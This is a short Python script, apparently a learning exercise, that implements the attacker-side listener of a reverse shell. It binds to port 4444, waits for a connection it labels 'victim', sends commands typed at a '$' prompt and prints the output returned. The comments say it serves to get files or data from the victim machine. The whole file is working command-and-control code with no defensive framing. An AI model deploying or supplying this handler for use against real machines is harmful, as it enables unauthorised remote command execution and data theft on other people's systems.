import socket
#AF_INET use for IPv4  SOCK_STREAM use for TCP connection
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
# Reuse Address
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
#bind() use for IP and PORT
s.bind(("127.0.0.1",4444))
print("listening....")
s.listen(1)
victim,addr = s.accept()
print("connected.")
# while loop for take command one or more time
while True:
   
    # cmd variable use execute command
    cmd=input("$ ")
   
    #encode() use for encode the string to byte
    victim.send(cmd.encode())
    if cmd=="exit":
        break
    # Is use for get file or data of victim machine
    output=(victim.recv(1024)).decode()
    print(output)
victim.close()
s.close()